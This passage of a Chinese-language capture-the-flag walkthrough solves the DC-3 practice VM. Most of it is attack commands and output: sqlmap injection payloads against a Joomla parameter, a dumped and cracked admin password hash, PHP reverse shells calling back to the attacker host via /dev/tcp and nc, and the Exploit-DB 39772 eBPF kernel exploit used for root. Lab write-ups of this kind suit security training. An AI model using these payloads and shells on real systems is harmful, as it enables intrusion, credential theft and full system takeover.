+| #__schemas          |
+| #__session          |
+| #__tags             |
+| #__template_styles  |
+| #__ucm_base         |
+| #__ucm_content      |
+| #__ucm_history      |
+| #__update_sites_ext |
+| #__update_sites     |
+| #__updates          |
+| #__user_keys        |
+| #__user_notes       |
+| #__user_profiles    |
+| #__user_usergroup_m |
+| #__usergroups       |
+| #__users            |
+| #__utf8_conversion  |
+| #__viewlevels       |
++---------------------+
+
+[12:20:48] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 97 times
+[12:20:48] [INFO] fetched data logged to text files under '/Users/nothx/.local/share/sqlmap/output/192.168.2.231'
+[12:20:48] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 12:20:48 /2021-09-03/
+```
+
+爆列
+
+```javascript
+命令：
+sqlmap -u "http://192.168.2.231/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --dbms mysql -D joomladb -T '#__users' --columns
+```
+
+![8](https://havocykp.github.io/assets/images/img_blog5/8.png)
+
+爆字段
+
+用户名：admin
+
+密码：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
+
+```javascript
+nothx@MacBookPro  ~  sqlmap -u "http://192.168.2.231/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --dbms mysql -D joomladb -T '#__users' -C id,name,password,username --dump
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.5.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:51:18 /2021-09-03/
+
+[22:51:18] [INFO] testing connection to the target URL
+[22:51:18] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+you have not declared cookie(s), while server wants to set its own ('460ada11b31d3c5e5ca6e58fd5d3de27=2j5hjpldgd8...k62lnr60k3'). Do you want to use those [Y/n] y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(3218,CONCAT(0x2e,0x7176706a71,(SELECT (ELT(3218=3218,1))),0x71627a6271),6579))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2854 FROM (SELECT(SLEEP(5)))KXQz)
+---
+[22:51:21] [INFO] testing MySQL
+[22:51:21] [INFO] confirming MySQL
+[22:51:21] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.0
+[22:51:21] [INFO] fetching entries of column(s) 'id,name,password,username' for table '#__users' in database 'joomladb'
+[22:51:21] [INFO] retrieved: '629'
+[22:51:21] [INFO] retrieved: 'admin'
+[22:51:21] [INFO] retrieved: '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'
+[22:51:21] [INFO] retrieved: 'admin'
+Database: joomladb
+Table: #__users
+[1 entry]
++-----+-------+--------------------------------------------------------------+----------+
+| id  | name  | password                                                     | username |
++-----+-------+--------------------------------------------------------------+----------+
+| 629 | admin | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    |
++-----+-------+--------------------------------------------------------------+----------+
+
+[22:51:21] [INFO] table 'joomladb.`#__users`' dumped to CSV file '/Users/nothx/.local/share/sqlmap/output/192.168.2.231/dump/joomladb/#__users.csv'
+[22:51:21] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 9 times
+[22:51:21] [INFO] fetched data logged to text files under '/Users/nothx/.local/share/sqlmap/output/192.168.2.231'
+[22:51:21] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 22:51:21 /2021-09-03/
+```
+
+破解密码hash，撞库；这里使用 johnny尝试暴力破解
+
+创建文件将密码hash保存
+
+![9](https://havocykp.github.io/assets/images/img_blog5/9.png)
+
+暴力破解
+
+命令：john password
+
+得到明文密码：snoopy
+
+![10](https://havocykp.github.io/assets/images/img_blog5/10.png)
+
+进行提权
+
+思路：先获得webshell，而后链接后虚拟终端进行反弹shell，最后获得低权限shell后再进行提权
+
+通过获取的账号密码：admin/snoopy 登录后台
+
+<http://192.168.2.231/administrator/>
+
+![11](https://havocykp.github.io/assets/images/img_blog5/11.png)
+
+具体操作：
+
+点击页面右侧的 Templates --> 再点击 Templates --> 点击 Beez3 Detail and Files --> 点击index.php 进入网页源码
+
+![12](https://havocykp.github.io/assets/images/img_blog5/12.png)
+
+在这里找到可编辑的php文件，可以插入恶意代码，进行反弹shell
+
+在管理页面的 index.php中写入反弹shell代码，并按save进行保存
+
+用system() 执行bash -c 的编码如下：
+
+```javascript
+<?php
+system("bash -c 'bash -i >& /dev/tcp/192.168.2.110/6666 0>&1' ");    
+?>
+```
+
+![13](https://havocykp.github.io/assets/images/img_blog5/13.png)
+
+在 parrot中输入nc命令，进行监听
+
+命令：nc -lvvp 6666
+
+![14](https://havocykp.github.io/assets/images/img_blog5/14.png)
+
+反弹shell触发（访问DC-3的默认主页）
+
+**测试并没有反弹成功。**
+
+**方法2：**
+
+**新建php文件**
+
+**路径： /templates/beez3/html/shellcode.php**
+
+```javascript
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.110 6666 >/tmp/f');?>
+```
+
+![15](https://havocykp.github.io/assets/images/img_blog5/15.png)
+
+**编写反弹shell的php代码，监听6666端口，并执行脚本文件，将反弹靶机shell到parrot**
+
+<http://192.168.2.231/templates/beez3/html/shellcode.php>
+
+![16](https://havocykp.github.io/assets/images/img_blog5/16.png)
+
+**得到反弹的getshell后，获取目标主机的操作系统版本**
+
+**命令：uname -a**
+
+​		  **cat /etc/issue**
+
+​          **lsb_release -a**
+
+![17](https://havocykp.github.io/assets/images/img_blog5/17.png)
+
+**对应版本为 Ubuntu 16.04，用searchsploit搜索可利用的提权漏洞**
+
+```javascript
+命令：
+┌─[root@pendo]─[/home/pendo]
+└──╼ #searchsploit Ubuntu 16.04
+```
+
+**发现一个 “拒绝服务漏洞”，可以用来提权**
+
+![18](https://havocykp.github.io/assets/images/img_blog5/18.png)
+
+**查看漏洞介绍**
+
+```javascript
+┌─[root@pendo]─[/home/pendo]
+└──╼ #cp /usr/share/exploitdb/exploits/linux/local/39772.txt /home/pendo/ubuntu-1604-shell.txt
+ot@pendo]─[/home/pendo]
+└──╼ #cat ubuntu-1604-shell.txt
+
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
+
+In Linux >=4.4, when the CONFIG_BPF_SYSCALL config option is set and the
+kernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,
+unprivileged code can use the bpf() syscall to load eBPF socket filter programs.
+These conditions are fulfilled in Ubuntu 16.04.
+
+When an eBPF program is loaded using bpf(BPF_PROG_LOAD, ...), the first
+function that touches the supplied eBPF instructions is
+replace_map_fd_with_map_ptr(), which looks for instructions that reference eBPF
+map file descriptors and looks up pointers for the corresponding map files.
+This is done as follows:
+
+	/* look for pseudo eBPF instructions that access map FDs and
+	 * replace them with actual map pointers
+	 */
+	static int replace_map_fd_with_map_ptr(struct verifier_env *env)
+	{
+		struct bpf_insn *insn = env->prog->insnsi;
+		int insn_cnt = env->prog->len;
+		int i, j;
+
+		for (i = 0; i < insn_cnt; i++, insn++) {
+			[checks for bad instructions]
+
+			if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) {
+				struct bpf_map *map;
+				struct fd f;
+
+				[checks for bad instructions]
+
+				f = fdget(insn->imm);
+				map = __bpf_map_get(f);
+				if (IS_ERR(map)) {
+					verbose("fd %d is not pointing to valid bpf_map\n",
+						insn->imm);
+					fdput(f);
+					return PTR_ERR(map);
+				}
+
+				[...]
+			}
+		}
+		[...]
+	}
+
+
+__bpf_map_get contains the following code:
+
+/* if error is returned, fd is released.
+ * On success caller should complete fd access with matching fdput()
+ */
+struct bpf_map *__bpf_map_get(struct fd f)
+{
+	if (!f.file)
+		return ERR_PTR(-EBADF);
+	if (f.file->f_op != &bpf_map_fops) {
+		fdput(f);
+		return ERR_PTR(-EINVAL);
+	}
+
+	return f.file->private_data;
+}
+
+The problem is that when the caller supplies a file descriptor number referring
+to a struct file that is not an eBPF map, both __bpf_map_get() and
+replace_map_fd_with_map_ptr() will call fdput() on the struct fd. If
+__fget_light() detected that the file descriptor table is shared with another
+task and therefore the FDPUT_FPUT flag is set in the struct fd, this will cause
+the reference count of the struct file to be over-decremented, allowing an
+attacker to create a use-after-free situation where a struct file is freed
+although there are still references to it.
+
+A simple proof of concept that causes oopses/crashes on a kernel compiled with
+memory debugging options is attached as crasher.tar.
+
+
+One way to exploit this issue is to create a writable file descriptor, start a
+write operation on it, wait for the kernel to verify the file's writability,
+then free the writable file and open a readonly file that is allocated in the
+same place before the kernel writes into the freed file, allowing an attacker
+to write data to a readonly file. By e.g. writing to /etc/crontab, root
+privileges can then be obtained.
+
+There are two problems with this approach:
+
+The attacker should ideally be able to determine whether a newly allocated
+struct file is located at the same address as the previously freed one. Linux
+provides a syscall that performs exactly this comparison for the caller:
+kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, new_fd).
+
+In order to make exploitation more reliable, the attacker should be able to
+pause code execution in the kernel between the writability check of the target
+file and the actual write operation. This can be done by abusing the writev()
+syscall and FUSE: The attacker mounts a FUSE filesystem that artificially delays
+read accesses, then mmap()s a file containing a struct iovec from that FUSE
+filesystem and passes the result of mmap() to writev(). (Another way to do this
+would be to use the userfaultfd() syscall.)
+
+writev() calls do_writev(), which looks up the struct file * corresponding to
+the file descriptor number and then calls vfs_writev(). vfs_writev() verifies
+that the target file is writable, then calls do_readv_writev(), which first
+copies the struct iovec from userspace using import_iovec(), then performs the
+rest of the write operation. Because import_iovec() performs a userspace memory
+access, it may have to wait for pages to be faulted in - and in this case, it
+has to wait for the attacker-owned FUSE filesystem to resolve the pagefault,
+allowing the attacker to suspend code execution in the kernel at that point
+arbitrarily.
+
+An exploit that puts all this together is in exploit.tar. Usage:
+
+user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
+user@host:~/ebpf_mapfd_doubleput$ ./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+root@host:~/ebpf_mapfd_doubleput# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)
+
+This exploit was tested on a Ubuntu 16.04 Desktop system.
+
+Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7
+
+
+Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552
+Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+
+```
+
+先通过 parrot 下载github的39772文件
+
+打开39772.txt可以看到文件的下载路径：
+
+<https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip>
+
+使用 parrot下载
+
+```javascript
+命令：
+┌─[root@pendo]─[/home/pendo]
+└──╼ #wget --no-check-certificate https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+
+```
+
+![19](https://havocykp.github.io/assets/images/img_blog5/19.png)
+
+下载失败，解决 GitHub的raw.githubusercontent.com无法连接问题
+
+打开 <https://www.ipaddress.com/>
+
+输入：raw.githubusercontent.com
+
+将查询到的IP地址写入 /etc/hosts 文件
+
+![20](https://havocykp.github.io/assets/images/img_blog5/20.png)
+
+解压
+
+![21](https://havocykp.github.io/assets/images/img_blog5/21.png)
+
+进入39772文件夹，在当前路径开启 python.server，供DC-3下载（python3与python2有区别）
+
+```javascript
+命令：
+┌─[✗]─[root@pendo]─[/home/pendo/39772]
+└──╼ #python3 -m http.server 9999
+```
+
+![22](https://havocykp.github.io/assets/images/img_blog5/22.png)
+
+在DC-3 中下载
+
+![23](https://havocykp.github.io/assets/images/img_blog5/23.png)
+
+进行提权操作
+
+解压exploit.tar文件，命令：tar -xvf exploit.tar
+
+![24](https://havocykp.github.io/assets/images/img_blog5/24.png)
+
+编译脚本
+
+```javascript
+命令：
+$ cd ebpf_mapfd_doubleput_exploit
+$ pwd
+/var/www/html/templates/beez3/html/ebpf_mapfd_doubleput_exploit
+$ ls
+compile.sh
+doubleput.c
+hello.c
+suidhelper.c
+$ chmod +x compole.sh
+chmod: cannot access 'compole.sh': No such file or directory
+$ chmod +x compile.sh
+$ ./compile.sh
+doubleput.c: In function 'make_setuid':
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)""
+               ^
+$ ls
+compile.sh
+doubleput
+doubleput.c
+hello
+hello.c
+suidhelper
+suidhelper.c
+$ 
+```
+
+![25](https://havocykp.github.io/assets/images/img_blog5/25.png)
+
+执行提权脚本
+
+命令：./doubleput
+
+```javascript
+writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+whoami
+root
+pwd
+/var/www/html/templates/beez3/html/ebpf_mapfd_doubleput_exploit
+cd /root
+ls
+the-flag.txt
+cat the-flag.txt
+ __        __   _ _   ____                   _ _ _ _ 
+ \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
+  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
+   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
+    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
+                                                     
+
+Congratulations are in order.  :-)
+
+I hope you've enjoyed this challenge as I enjoyed making it.
+
+If there are any ways that I can improve these little challenges,
+please let me know.
+
+As per usual, comments and complaints can be sent via Twitter to @DCAU7
+
+Have a great day!!!!
+
+
+```
+
+![26](https://havocykp.github.io/assets/images/img_blog5/26.png)
+
